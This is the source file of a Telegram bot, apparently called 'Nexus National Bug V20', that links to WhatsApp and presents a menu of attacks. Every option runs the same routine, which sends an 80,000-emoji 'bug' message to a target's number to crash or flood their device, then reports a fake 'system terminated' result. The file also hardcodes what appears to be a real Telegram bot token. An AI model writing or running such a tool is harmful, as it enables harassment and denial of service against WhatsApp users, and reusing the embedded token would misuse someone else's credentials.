const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    makeCacheableSignalKeyStore 
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const { Telegraf, Markup } = require('telegraf');

// --- [ SYSTEM CONFIG ] ---
const TG_TOKEN = '8655630932:AAECvnRecMAmBX44Ms-Rsp0gUwWdkWn-L5o';
const bot = new Telegraf(TG_TOKEN);
const owner = "Sasiya";
const logo = 'https://i.ibb.co/LzgMB0pj/image.jpg';

let sock; 

async function startNexus() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_session');
    
    sock = makeWASocket({
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "silent" })),
        },
        printQRInTerminal: false,
        logger: pino({ level: "silent" }),
        browser: ["Nexus-V20", "Safari", "1.0.0"]
    });

    sock.ev.on('creds.update', saveCreds);

    // --- [ MAIN INTERFACE ] ---
    bot.start((ctx) => {
        ctx.replyWithPhoto(logo, {
            caption: `🛰️ ϟ **𝐍𝐄𝐗𝐔𝐒 𝐍𝐀𝐓𝐈𝐎𝐍𝐀𝐋 𝐁𝐔𝐆 𝐕𝟐𝟎** ϟ 🧬\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n*OPERATOR:* ${owner} [ROOT]\n*STATUS:* SYSTEM ACTIVE 🟢\n━━━━━━━━━━━━━━━━━━━━━━━━━━\nSelect a module to begin enforcement:`,
            parse_mode: 'Markdown',
            ...Markup.inlineKeyboard([
                [Markup.button.callback('🔗 LINK WHATSAPP', 'get_code')],
                [Markup.button.callback('💀 OPEN BUG MENU 💀', 'open_bug_menu')],
                [Markup.button.callback('🛡️ SERVER STATUS', 'diag')]
            ])
        });
    });

    // --- [ 9-LEVEL EXTREME BUG MENU ] ---
    bot.action('open_bug_menu', (ctx) => {
        ctx.answerCbQuery();
        ctx.editMessageCaption(`
💀 **ULTIMATE BUG SELECTION MENU** 💀
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
*Select a payload to inject into target:*
        `, Markup.inlineKeyboard([
            [Markup.button.callback('🚫 BAN BUG', 'exec_bug'), Markup.button.callback('🔥 DEVICE CRASH', 'exec_bug')],
            [Markup.button.callback('📂 DATABASE WIPE', 'exec_bug'), Markup.button.callback('⚡ RAM KILLER', 'exec_bug')],
            [Markup.button.callback('🧬 BINARY FLOOD', 'exec_bug'), Markup.button.callback('🛡️ WAF BYPASS', 'exec_bug')],
            [Markup.button.callback('📡 UDP PACKET', 'exec_bug'), Markup.button.callback('🧪 RCE EXPLOIT', 'exec_bug')],
            [Markup.button.callback('⚠️ SECURITY FLAG', 'exec_bug')],
            [Markup.button.callback('🔙 BACK TO MAIN', 'start_back')]
        ], { columns: 2 }));
    });

    // --- [ PAIRING CODE ENGINE ] ---
    bot.action('get_code', (ctx) => {
        ctx.answerCbQuery();
        ctx.reply("📱 *ENTER YOUR WHATSAPP NUMBER:*\nExample: \`947xxxxxxxxx\`");

        bot.on('text', async (numCtx) => {
            const num = numCtx.message.text.trim();
            if (!/^\d+$/.test(num)) return;
            try {
                let code = await sock.requestPairingCode(num);
                numCtx.reply(`🔐 **PAIRING CODE:** \n\n\`${code}\` \n\n*Use this in Linked Devices.*`);
            } catch (e) { numCtx.reply("❌ Connection Error."); }
        });
    });

    // --- [ BUG EXECUTION LOGIC ] ---
    bot.action('exec_bug', async (ctx) => {
        ctx.answerCbQuery();
        ctx.reply("🎯 **IDENTIFY TARGET:**\nEnter target WhatsApp number:");

        bot.on('text', async (targetCtx) => {
            const target = targetCtx.message.text.trim() + "@s.whatsapp.net";
            let { message_id } = await targetCtx.reply("🛠️ **BOOTING BUG MODULE...**");

            // Cyber Animations
            await delay(1000);
            await bot.telegram.editMessageText(targetCtx.chat.id, message_id, null, "🧬 **ENCODING PAYLOAD... [45%]**");
            await delay(1000);
            await bot.telegram.editMessageText(targetCtx.chat.id, message_id, null, "🔥 **INJECTING OVERFLOW... [90%]**");

            // The actual bug string
            const bugPayload = "👾".repeat(80000); 

            try {
                await sock.sendMessage(target, { text: bugPayload });
                const report = `
🚀 **BUG INJECTION COMPLETED** 🚀
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
*TARGET:* ${targetCtx.message.text}
*PAYLOAD ID:* NX-ULTRA-V20
*RESULT:* SYSTEM TERMINATED 🔴
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    *VERIFIED BY: ${owner} @ NEXUS*
`;
                await bot.telegram.editMessageText(targetCtx.chat.id, message_id, null, report, { parse_mode: 'Markdown' });
            } catch (err) {
                targetCtx.reply("❌ **ERROR:** Link your WhatsApp first using the /start menu.");
            }
        });
    });

    bot.launch();
}

startNexus();
